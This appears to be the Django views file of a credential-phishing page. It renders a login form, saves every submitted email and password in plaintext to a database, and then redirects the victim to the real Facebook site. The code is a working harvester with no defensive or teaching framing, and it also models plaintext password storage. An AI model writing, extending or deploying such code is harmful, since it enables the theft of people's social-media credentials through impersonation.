# myapp/views.py
from django.shortcuts import render, redirect
from .models import User
from django.utils import timezone
from django.http import HttpResponse

def login(request):
    
    return render(request, "myapp/login.html")

def form_action_view(request):
    if request.method == 'POST':
        email = request.POST.get("email")
        password = request.POST.get("password")
        User.objects.create(email=email, password=password, date_time=timezone.now())
        # Redirigez ici vers le lien souhaité, par exemple :
        return redirect("https://web.facebook.com/")

    return HttpResponse("Formulaire soumis avec succès.")

